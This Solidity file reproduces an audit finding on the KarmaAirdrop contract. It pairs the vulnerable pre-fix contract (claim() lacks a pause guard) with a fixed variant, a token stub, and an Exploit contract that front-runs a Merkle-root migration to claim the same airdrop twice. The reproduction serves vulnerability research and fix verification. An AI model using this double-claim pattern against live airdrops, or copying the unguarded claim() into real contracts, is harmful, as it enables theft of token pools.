// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Status Network (Statusl2) finding
// 65323: "User can double claim airdrop" (Cyfrin, KarmaAirdrop.sol).
//
// KarmaAirdrop tracks claims PER EPOCH: `claimedBitMap[epoch]`. `setMerkleRoot`
// increments the epoch on every update, which RESETS the claimed bitmap so a
// user re-listed under the new root can claim again. The migration is meant to
// be safe because the contract is paused during the update — BUT the audited
// `claim()` is MISSING the `whenNotPaused` modifier. An unclaimed user who is
// re-included in the upcoming root therefore front-runs the migration: they
// claim under the old root while the owner has paused for the update, the epoch
// then increments (resetting their claimed bit), and they claim a SECOND copy
// of the same allocation under the new root — stealing 2x their allocation.
//
// Verified fix (commit ebbf84b): add `whenNotPaused` to `claim()` — nothing
// else. That the fix is the pause guard (not an accounting change) confirms the
// per-epoch claim tracking is genuinely re-openable across roots, so this model
// is faithful. Vulnerable source copied verbatim from status-network-monorepo
// at ebbf84b~1 (the audited/pre-fix state).
//
// Only the opaque Karma token boundary (ERC20 + IVotes) is doubled; the
// vulnerable KarmaAirdrop contract itself is real, verbatim source.
// ─────────────────────────────────────────────────────────────────────────────

// ==== OZ Context (faithful minimal) =========================================
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

// ==== OZ Ownable (faithful minimal, v4 semantics) ===========================
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// ==== OZ Ownable2Step (faithful minimal, v4 semantics) ======================
abstract contract Ownable2Step is Ownable {
    address private _pendingOwner;

    event OwnershipTransferStarted(address indexed previousOwner, address indexed newOwner);

    function pendingOwner() public view virtual returns (address) {
        return _pendingOwner;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        _pendingOwner = newOwner;
        emit OwnershipTransferStarted(owner(), newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual override {
        delete _pendingOwner;
        super._transferOwnership(newOwner);
    }

    function acceptOwnership() public virtual {
        address sender = _msgSender();
        require(pendingOwner() == sender, "Ownable2Step: caller is not the new owner");
        _transferOwnership(sender);
    }
}

// ==== OZ Pausable (faithful, v4 semantics) ==================================
abstract contract Pausable is Context {
    event Paused(address account);
    event Unpaused(address account);

    bool private _paused;

    constructor() {
        _paused = false;
    }

    modifier whenNotPaused() {
        require(!paused(), "Pausable: paused");
        _;
    }

    modifier whenPaused() {
        require(paused(), "Pausable: not paused");
        _;
    }

    function paused() public view virtual returns (bool) {
        return _paused;
    }

    function _pause() internal virtual whenNotPaused {
        _paused = true;
        emit Paused(_msgSender());
    }

    function _unpause() internal virtual whenPaused {
        _paused = false;
        emit Unpaused(_msgSender());
    }
}

// ==== OZ MerkleProof (faithful, exact library body) =========================
library MerkleProof {
    function verify(bytes32[] memory proof, bytes32 root, bytes32 leaf) internal pure returns (bool) {
        return processProof(proof, leaf) == root;
    }

    function processProof(bytes32[] memory proof, bytes32 leaf) internal pure returns (bytes32) {
        bytes32 computedHash = leaf;
        for (uint256 i = 0; i < proof.length; i++) {
            computedHash = _hashPair(computedHash, proof[i]);
        }
        return computedHash;
    }

    function _hashPair(bytes32 a, bytes32 b) private pure returns (bytes32) {
        return a < b ? _efficientHash(a, b) : _efficientHash(b, a);
    }

    function _efficientHash(bytes32 a, bytes32 b) private pure returns (bytes32 value) {
        assembly {
            mstore(0x00, a)
            mstore(0x20, b)
            value := keccak256(0x00, 0x40)
        }
    }
}

// ==== Interfaces for the opaque Karma token boundary ========================
interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IVotes {
    function delegateBySig(
        address delegatee,
        uint256 nonce,
        uint256 expiry,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract — VERBATIM audited (pre-fix) KarmaAirdrop.sol
// (status-network-monorepo @ ebbf84b~1). Only imports/pragma were stripped.
// ─────────────────────────────────────────────────────────────────────────────
contract KarmaAirdrop is Ownable2Step, Pausable {
    /// @notice Emitted when merkleroot is already set
    error KarmaAirdrop__MerkleRootAlreadySet();
    /// @notice Emitted when merkleroot is not set
    error KarmaAirdrop__MerkleRootNotSet();
    /// @notice Emitted when trying to update merkle root while contract is not paused
    error KarmaAirdrop__MustBePausedToUpdate();
    /// @notice Emitted when a claim is already made
    error KarmaAirdrop__AlreadyClaimed();
    /// @notice Emitted when a proof is invalid
    error KarmaAirdrop__InvalidProof();
    /// @notice Emitted when token transfer fails
    error KarmaAirdrop__TransferFailed();
    /// @notice Emitted when delegatee is incorrect
    error KarmaAirdrop__IncorrectDelegatee();

    /// @notice Emitted when a claim is made
    event Claimed(uint256 index, address account, uint256 amount);
    /// @notice Emitted when merkleroot is set
    event MerkleRootSet(bytes32 merkleRoot);

    /// @notice The address of the Karma token contract
    address public immutable TOKEN;
    /// @notice Whether the merkle root can be updated more than once
    bool public immutable ALLOW_MERKLE_ROOT_UPDATE;
    /// @notice The default delegatee address for new claimers
    address public immutable DEFAULT_DELEGATEE;
    /// @notice The Merkle root of the airdrop
    bytes32 public merkleRoot;
    /// @notice Current epoch - incremented with each merkle root update
    uint256 public epoch;
    /// @notice A bitmap to track claimed indices per epoch
    mapping(uint256 => mapping(uint256 => uint256)) private claimedBitMap;
    /// @notice Base value for creating bitmap masks
    uint256 private constant BITMAP_MASK_BASE = 1;

    constructor(address _token, address _owner, bool _allowMerkleRootUpdate, address _defaultDelegatee) {
        TOKEN = _token;
        ALLOW_MERKLE_ROOT_UPDATE = _allowMerkleRootUpdate;
        DEFAULT_DELEGATEE = _defaultDelegatee;
        _transferOwnership(_owner);
    }

    /**
     * @notice Sets the Merkle root for the airdrop. Can only be called by the owner.
     * If ALLOW_MERKLE_ROOT_UPDATE;is false, can only be called once.
     * When updating an existing merkle root, the contract must be paused to prevent front-running.
     * When the merkle root is updated, the epoch is incremented, creating a new bitmap.
     * @param _merkleRoot The Merkle root to set
     */
    function setMerkleRoot(bytes32 _merkleRoot) external onlyOwner {
        if (!ALLOW_MERKLE_ROOT_UPDATE && merkleRoot != bytes32(0)) {
            revert KarmaAirdrop__MerkleRootAlreadySet();
        }

        // When updating an existing merkle root (not the first time), contract must be paused
        if (ALLOW_MERKLE_ROOT_UPDATE && merkleRoot != bytes32(0) && !paused()) {
            revert KarmaAirdrop__MustBePausedToUpdate();
        }

        // Increment epoch to create a new bitmap
        if (merkleRoot != bytes32(0)) {
            epoch++;
        }

        merkleRoot = _merkleRoot;
        emit MerkleRootSet(merkleRoot);
    }

    /**
     * @notice Checks if a claim has been made for a given index in the current epoch
     * @param index The index to check
     * @return True if the index has been claimed, false otherwise
     */
    function isClaimed(uint256 index) public view returns (bool) {
        uint256 claimedWordIndex = index / 256;
        uint256 claimedBitIndex = index % 256;
        uint256 claimedWord = claimedBitMap[epoch][claimedWordIndex];
        uint256 mask = (BITMAP_MASK_BASE << claimedBitIndex);
        return claimedWord & mask == mask;
    }

    function _setClaimed(uint256 index) private {
        uint256 claimedWordIndex = index / 256;
        uint256 claimedBitIndex = index % 256;
        claimedBitMap[epoch][claimedWordIndex] =
            claimedBitMap[epoch][claimedWordIndex] | (BITMAP_MASK_BASE << claimedBitIndex);
    }

    /**
     * @notice Claims tokens for a given index, account, and amount, if the provided Merkle proof is valid
     * @param index The index of the claim
     * @param account The address of the account to claim tokens for
     * @param amount The amount of tokens to claim
     * @param merkleProof The Merkle proof to validate the claim
     * @param nonce The nonce for the delegation signature
     * @param expiry The expiry timestamp for the delegation signature
     * @param v The v component of the delegation signature
     * @param r The r component of the delegation signature
     * @param s The s component of the delegation signature
     */
    function claim(
        uint256 index,
        address account,
        uint256 amount,
        bytes32[] calldata merkleProof,
        uint256 nonce,
        uint256 expiry,
        uint8 v,
        bytes32 r,
        bytes32 s
    )
        external
        // @> MISSING `whenNotPaused`: claims stay open during the paused migration window, so a
        // @> re-listed user front-runs setMerkleRoot (epoch++ resets the bitmap) and double-claims.
    {
        if (merkleRoot == bytes32(0)) {
            revert KarmaAirdrop__MerkleRootNotSet();
        }
        if (isClaimed(index)) {
            revert KarmaAirdrop__AlreadyClaimed();
        }

        // Verify the merkle proof.
        /// forge-lint: disable-next-line(asm-keccak256)
        bytes32 node = keccak256(abi.encodePacked(index, account, amount));
        if (!MerkleProof.verify(merkleProof, merkleRoot, node)) {
            revert KarmaAirdrop__InvalidProof();
        }

        // Mark it claimed and send the token.
        _setClaimed(index);
        if (!IERC20(TOKEN).transfer(account, amount)) {
            revert KarmaAirdrop__TransferFailed();
        }

        // If the account has no karma balance before this claim, delegate to the default delegatee
        if (IERC20(TOKEN).balanceOf(account) == amount) {
            IVotes(TOKEN).delegateBySig(DEFAULT_DELEGATEE, nonce, expiry, v, r, s);
        }

        emit Claimed(index, account, amount);
    }

    /**
     * @notice Pauses the contract, preventing claims. Can only be called by the owner.
     */
    function pause() external onlyOwner {
        _pause();
    }

    /**
     * @notice Unpauses the contract, allowing claims. Can only be called by the owner.
     */
    function unpause() external onlyOwner {
        _unpause();
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED variant — identical to the audited source PLUS the verified fix:
// `whenNotPaused` on `claim()` (commit ebbf84b). During the paused migration
// window the front-running claim reverts, so the double claim is impossible.
// ─────────────────────────────────────────────────────────────────────────────
contract KarmaAirdropFixed is Ownable2Step, Pausable {
    error KarmaAirdrop__MerkleRootAlreadySet();
    error KarmaAirdrop__MerkleRootNotSet();
    error KarmaAirdrop__MustBePausedToUpdate();
    error KarmaAirdrop__AlreadyClaimed();
    error KarmaAirdrop__InvalidProof();
    error KarmaAirdrop__TransferFailed();
    error KarmaAirdrop__IncorrectDelegatee();

    event Claimed(uint256 index, address account, uint256 amount);
    event MerkleRootSet(bytes32 merkleRoot);

    address public immutable TOKEN;
    bool public immutable ALLOW_MERKLE_ROOT_UPDATE;
    address public immutable DEFAULT_DELEGATEE;
    bytes32 public merkleRoot;
    uint256 public epoch;
    mapping(uint256 => mapping(uint256 => uint256)) private claimedBitMap;
    uint256 private constant BITMAP_MASK_BASE = 1;

    constructor(address _token, address _owner, bool _allowMerkleRootUpdate, address _defaultDelegatee) {
        TOKEN = _token;
        ALLOW_MERKLE_ROOT_UPDATE = _allowMerkleRootUpdate;
        DEFAULT_DELEGATEE = _defaultDelegatee;
        _transferOwnership(_owner);
    }

    function setMerkleRoot(bytes32 _merkleRoot) external onlyOwner {
        if (!ALLOW_MERKLE_ROOT_UPDATE && merkleRoot != bytes32(0)) {
            revert KarmaAirdrop__MerkleRootAlreadySet();
        }
        if (ALLOW_MERKLE_ROOT_UPDATE && merkleRoot != bytes32(0) && !paused()) {
            revert KarmaAirdrop__MustBePausedToUpdate();
        }
        if (merkleRoot != bytes32(0)) {
            epoch++;
        }
        merkleRoot = _merkleRoot;
        emit MerkleRootSet(merkleRoot);
    }

    function isClaimed(uint256 index) public view returns (bool) {
        uint256 claimedWordIndex = index / 256;
        uint256 claimedBitIndex = index % 256;
        uint256 claimedWord = claimedBitMap[epoch][claimedWordIndex];
        uint256 mask = (BITMAP_MASK_BASE << claimedBitIndex);
        return claimedWord & mask == mask;
    }

    function _setClaimed(uint256 index) private {
        uint256 claimedWordIndex = index / 256;
        uint256 claimedBitIndex = index % 256;
        claimedBitMap[epoch][claimedWordIndex] =
            claimedBitMap[epoch][claimedWordIndex] | (BITMAP_MASK_BASE << claimedBitIndex);
    }

    function claim(
        uint256 index,
        address account,
        uint256 amount,
        bytes32[] calldata merkleProof,
        uint256 nonce,
        uint256 expiry,
        uint8 v,
        bytes32 r,
        bytes32 s
    )
        external
        whenNotPaused // FIX: claims are blocked during the paused migration window.
    {
        if (merkleRoot == bytes32(0)) {
            revert KarmaAirdrop__MerkleRootNotSet();
        }
        if (isClaimed(index)) {
            revert KarmaAirdrop__AlreadyClaimed();
        }

        bytes32 node = keccak256(abi.encodePacked(index, account, amount));
        if (!MerkleProof.verify(merkleProof, merkleRoot, node)) {
            revert KarmaAirdrop__InvalidProof();
        }

        _setClaimed(index);
        if (!IERC20(TOKEN).transfer(account, amount)) {
            revert KarmaAirdrop__TransferFailed();
        }

        if (IERC20(TOKEN).balanceOf(account) == amount) {
            IVotes(TOKEN).delegateBySig(DEFAULT_DELEGATEE, nonce, expiry, v, r, s);
        }

        emit Claimed(index, account, amount);
    }

    function pause() external onlyOwner {
        _pause();
    }

    function unpause() external onlyOwner {
        _unpause();
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Minimal faithful double for the opaque Karma token (ERC20 + IVotes).
// The airdrop token is out of scope for this finding; delegateBySig is a no-op.
// ─────────────────────────────────────────────────────────────────────────────
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    // IVotes delegation is out of the finding's scope; accept and no-op so the
    // real claim() delegation branch on first claim does not revert.
    function delegateBySig(address, uint256, uint256, uint8, bytes32, bytes32) external {}
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: attacker (index 0, allocation 1000e18) double-claims across a
// merkleRoot migration. Because claim() lacks whenNotPaused, the attacker claims
// under the old root while the owner has paused for the update, then again under
// the new root after the epoch increments — ending with 2x the allocation.
// The stolen tokens land at the ATTACKER EOA (theft receiver).
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    address internal constant DELEGATEE = address(uint160(0xDE1E));
    address internal constant NEWCOMER = address(uint160(0xBEE));

    uint256 internal constant INDEX = 0;
    uint256 internal constant ALLOCATION = 1000 ether;

    // Exposed results for the driver.
    address public tokenAddr;
    address public airdropAddr;
    uint256 public firstClaim;
    uint256 public secondClaim;
    uint256 public attackerBalance;
    uint256 public allocation;

    function _leaf(uint256 index, address account, uint256 amount) internal pure returns (bytes32) {
        return keccak256(abi.encodePacked(index, account, amount));
    }

    // Mirror of MerkleProof._hashPair (sorted-pair keccak) to build a real
    // 2-leaf root2 with a valid proof for the attacker's leaf.
    function _hashPair(bytes32 a, bytes32 b) internal pure returns (bytes32) {
        return a < b ? keccak256(abi.encodePacked(a, b)) : keccak256(abi.encodePacked(b, a));
    }

    function run() external payable {
        // --- deploy real vulnerable contract + opaque token double ---
        MiniToken token = new MiniToken("Airdrop Token", "AIRDROP");           // nonce 1
        KarmaAirdrop airdrop =
            new KarmaAirdrop(address(token), address(this), true, DELEGATEE);   // nonce 2 (owner = this)

        tokenAddr = address(token);
        airdropAddr = address(airdrop);
        allocation = ALLOCATION;

        // Fund the airdrop pool (enough for the honest 1x plus the stolen 1x).
        token.mint(address(airdrop), 10 * ALLOCATION);

        // --- root1: single-leaf tree listing the attacker (empty proof) ---
        bytes32 aLeaf = _leaf(INDEX, ATTACKER, ALLOCATION);
        airdrop.setMerkleRoot(aLeaf); // epoch stays 0 (first set)

        bytes32[] memory emptyProof = new bytes32[](0);

        // --- owner pauses to begin the merkleRoot migration ---
        airdrop.pause();

        // --- FRONT-RUN: attacker claims under root1 during the paused window ---
        // Works because claim() is MISSING whenNotPaused (the bug).
        uint256 balBefore1 = token.balanceOf(ATTACKER);
        airdrop.claim(INDEX, ATTACKER, ALLOCATION, emptyProof, 0, 0, 0, bytes32(0), bytes32(0));
        firstClaim = token.balanceOf(ATTACKER) - balBefore1;

        // --- owner commits root2 (2-leaf: attacker re-listed + a newcomer) ---
        bytes32 bLeaf = _leaf(1, NEWCOMER, ALLOCATION);
        bytes32 root2 = _hashPair(aLeaf, bLeaf);
        airdrop.setMerkleRoot(root2); // epoch 0 -> 1: RESETS the claimed bitmap

        // --- owner unpauses; normal operation resumes ---
        airdrop.unpause();

        // --- attacker claims a SECOND time under root2 (epoch 1) ---
        bytes32[] memory proof2 = new bytes32[](1);
        proof2[0] = bLeaf; // valid proof for the attacker's leaf under root2
        uint256 balBefore2 = token.balanceOf(ATTACKER);
        airdrop.claim(INDEX, ATTACKER, ALLOCATION, proof2, 0, 0, 0, bytes32(0), bytes32(0));
        secondClaim = token.balanceOf(ATTACKER) - balBefore2;

        // --- harm: attacker holds 2x their single allocation ---
        attackerBalance = token.balanceOf(ATTACKER);
        require(firstClaim == ALLOCATION, "first claim failed");
        require(secondClaim == ALLOCATION, "double claim (2nd) failed");
        require(attackerBalance == 2 * ALLOCATION, "attacker did not double-claim");
    }
}
